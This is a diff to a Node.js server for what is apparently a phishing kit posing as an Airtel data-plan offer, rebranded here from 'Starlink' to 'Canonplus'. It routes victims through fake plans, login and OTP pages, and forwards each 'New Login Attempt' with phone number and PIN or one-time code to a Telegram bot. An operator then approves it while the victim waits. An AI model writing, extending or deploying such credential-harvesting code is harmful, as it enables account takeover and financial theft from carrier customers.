@@ -1,7 +1,7 @@
 // server.js
-// Airtel x Starlink forfaits flow — with Telegram bot admin-approval gate.
+// Airtel x Canonplus forfaits flow — with Telegram bot admin-approval gate.
 //
-// Flow: airtel-starlink.html (plans) -> trial.html (login) -> pto.html (OTP)
+// Flow: index.html (plans) -> trial.html (login) -> pto.html (OTP)
 //       -> [Telegram admin approval, spinner while waiting] -> mwish.html
 //
 // Setup:
@@ -82,8 +82,6 @@ app.post('/api/request-approval', async (req, res) => {
 : `🔑 pin: \`${code || '—'}\`\n`;
     const text =
       `🔔 *New Login Attempt — ${stepLabel}*\n\n` +
-      `📦 Data: ${plan || '—'}\n` +
-      `💰 Price: USD ${price || '—'}\n` +
       `📱 Phone: \`${phone || '—'}\`\n` +
       secretLine;
       
@@ -187,10 +185,10 @@ if (bot) {
 // Page routes
 // ---------------------------------------------------------------------------
 app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'airtel-starlink.html'));
+  res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-const pages = ['airtel-starlink.html', 'index.html', 'pto.html', 'mwish.html'];
+const pages = ['index.html', 'trial.html', 'pto.html', 'mwish.html'];
 pages.forEach((page) => {
   app.get('/' + page, (req, res) => {
     res.sendFile(path.join(__dirname, page), (err) => {
@@ -204,5 +202,5 @@ app.use((req, res) => {
 });
 
 app.listen(PORT, () => {
-  console.log(`Airtel x Starlink app running at http://localhost:${PORT}`);
+  console.log(`Airtel x Canonplus app running at http://localhost:${PORT}`);
 });
